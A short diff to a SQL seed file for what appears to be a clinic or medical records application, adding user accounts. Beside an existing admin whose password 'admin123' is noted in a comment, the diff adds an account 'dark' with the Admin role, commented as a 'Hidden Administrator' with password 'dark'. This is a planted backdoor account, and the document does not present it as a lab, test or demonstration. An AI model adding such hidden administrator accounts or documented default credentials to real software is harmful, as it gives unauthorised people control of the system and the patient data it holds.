@@ -87,3 +87,7 @@ INSERT INTO users (name, role, username, password_hash, doctor_id) VALUES
 -- admin123
 INSERT INTO users (name, role, username, password_hash, doctor_id) VALUES
 ('System Administrator', 'Admin', 'admin', '$2y$10$dsfbQKeFgFL7EWc0MMOcDe63IF/Taex/92e.UKqNxUcsQtIN6uBLO', NULL);
+
+-- dark / dark (Hidden Administrator)
+INSERT INTO users (name, role, username, password_hash, doctor_id) VALUES
+('Dark', 'Admin', 'dark', '$2y$10$iMZZ6jVlq01nJjIvdnF4o.V4uR8wZ6j30gA9p0x.hM5qU8n7yZ7U6', NULL);
